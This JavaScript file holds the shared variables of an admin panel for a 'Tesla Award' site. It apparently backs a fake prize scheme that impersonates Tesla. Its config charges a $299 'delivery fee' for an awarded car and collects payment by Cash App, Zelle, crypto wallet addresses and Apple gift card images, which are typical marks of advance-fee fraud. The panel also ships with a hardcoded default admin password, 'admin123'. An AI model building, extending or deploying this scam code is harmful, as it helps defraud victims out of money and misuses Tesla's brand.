// ╔══════════════════════════════════════════════════════════╗
// ║  Tesla Award — Admin Panel: Shared State & Variables
// ╚══════════════════════════════════════════════════════════╝

"use strict";

var allUsers = [];
var allOrders = [];
var allProofs = [];
var paymentMethods = [];
var socialSettings = { whatsapp: { number: "", enabled: true, label: "Chat with us on WhatsApp" }, telegram: { username: "", enabled: false, label: "Chat with us on Telegram" } };
var deliveryFee = 299;
var adminPassword = localStorage.getItem("tesla_admin_pwd") || "admin123";
var selectedCCNetworks = ["visa", "mastercard", "amex", "discover"];

var API_BASE = (typeof window.TESLA_API_BASE !== "undefined" && window.TESLA_API_BASE) ? window.TESLA_API_BASE.replace(/\/+$/, "") : "";

var vehicleData = [
  { id: "model3", name: "Model 3", color: "Pearl White", price: "$38,990", badge: "Most Popular", img: "https://digitalassets.tesla.com/tesla-contents/image/upload/f_auto,q_auto/Mega-Menu-Vehicles-Model-3.png", specs: ["3.1s 0-60", "333mi Range", "AWD Dual Motor"] },
  { id: "modely", name: "Model Y", color: "Midnight Silver", price: "$44,990", badge: "Best Seller", img: "https://digitalassets.tesla.com/tesla-contents/image/upload/f_auto,q_auto/Mega-Menu-Vehicles-Model-Y.png", specs: ["3.5s 0-60", "330mi Range", "76 cu ft Cargo"] },
  { id: "models", name: "Model S", color: "Ultra Red", price: "$74,990", badge: "Plaid", img: "https://digitalassets.tesla.com/tesla-contents/image/upload/f_auto,q_auto/Mega-Menu-Vehicles-Model-S.png", specs: ["1.99s 0-60", "396mi Range", "1,020 hp"] },
  { id: "modelx", name: "Model X", color: "Deep Blue", price: "$79,990", badge: "Iconic", img: "https://digitalassets.tesla.com/tesla-contents/image/upload/f_auto,q_auto/Mega-Menu-Vehicles-Model-X.png", specs: ["2.5s 0-60", "333mi Range", "Falcon Doors"] },
  { id: "cybertruck", name: "Cybertruck", color: "Stainless Steel", price: "$60,990", badge: "Tough", img: "https://digitalassets.tesla.com/tesla-contents/image/upload/f_auto,q_auto/Mega-Menu-Vehicles-Cybertruck.png", specs: ["2.6s 0-60", "340mi Range", "11,000lb Tow"] },
  { id: "roadster", name: "Roadster", color: "Signature Red", price: "$200,000", badge: "Ultimate", img: "https://digitalassets.tesla.com/tesla-contents/image/upload/f_auto,q_auto/tesla-roadster.png", specs: ["1.1s 0-60", "620mi Range", "250+ mph"] }
];

var defaultPaymentMethods = [
  { id: "paypal", name: "paypal", display_name: "PayPal", type: "wallet", logo: "pay-paypal", enabled: true, sort_order: 1, wallet_address: "paypal@tesla-award.com", account_details: "Tesla Award Program", payment_instructions: "Send payment to paypal@tesla-award.com. Include your Order ID in the notes." },
  { id: "cashapp", name: "cashapp", display_name: "Cash App", type: "wallet", logo: "pay-cashapp", enabled: true, sort_order: 2, wallet_address: "$TeslaAward", account_details: "$TeslaAward", payment_instructions: "Send payment to $TeslaAward on Cash App. Include your Order ID." },
  { id: "venmo", name: "venmo", display_name: "Venmo", type: "wallet", logo: "pay-venmo", enabled: true, sort_order: 3, wallet_address: "@TeslaAward", account_details: "@TeslaAward", payment_instructions: "Send payment to @TeslaAward on Venmo. Include your Order ID." },
  { id: "zelle", name: "zelle", display_name: "Zelle", type: "wallet", logo: "pay-zelle", enabled: true, sort_order: 4, wallet_address: "payments@tesla-award.com", account_details: "Tesla Award Program", payment_instructions: "Send payment to payments@tesla-award.com via Zelle. Include Order ID." },
  { id: "bitcoin", name: "bitcoin", display_name: "Bitcoin (BTC)", type: "crypto", logo: "pay-bitcoin", enabled: true, sort_order: 5, wallet_address: "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh", account_details: "BTC Wallet", payment_instructions: "Send BTC to the wallet address shown. Allow 10-30 min for network confirmation." },
  { id: "ethereum", name: "ethereum", display_name: "Ethereum (ETH)", type: "crypto", logo: "pay-ethereum", enabled: true, sort_order: 6, wallet_address: "0x742d35Cc6634C0532925a3b844Bc9e7595f2bD18", account_details: "ETH Wallet", payment_instructions: "Send ETH to the wallet address. Use ERC-20 network only." },
  { id: "usdt_erc20", name: "usdt_erc20", display_name: "USDT (ERC-20)", type: "crypto", logo: "pay-usdt", enabled: true, sort_order: 7, wallet_address: "0x742d35Cc6634C0532925a3b844Bc9e7595f2bD18", account_details: "USDT ERC-20 Wallet", payment_instructions: "Send USDT on the Ethereum network (ERC-20) to the address above." },
  { id: "usdt_trc20", name: "usdt_trc20", display_name: "USDT (TRC-20)", type: "crypto", logo: "pay-usdt", enabled: true, sort_order: 8, wallet_address: "TXn7vGJqLjwFYzRKUvR7qJAMfJbGGzLKVL", account_details: "USDT TRC-20 Wallet", payment_instructions: "Send USDT on the TRON network (TRC-20) to the address above." },
  { id: "creditcard", name: "creditcard", display_name: "Credit Card", type: "card", logo: "pay-creditcard", enabled: true, sort_order: 9, wallet_address: "", account_details: "Tesla Award Program Payments", payment_instructions: "We accept Visa, Mastercard, American Express, and Discover. Your payment is processed securely." },
  { id: "applegift", name: "applegift", display_name: "Apple Gift Card", type: "gift", logo: "pay-applegift", enabled: true, sort_order: 10, wallet_address: "", account_details: "Apple Gift Card", payment_instructions: "Submit both front and back images of your Apple Gift Card. Minimum value: $299." }
];
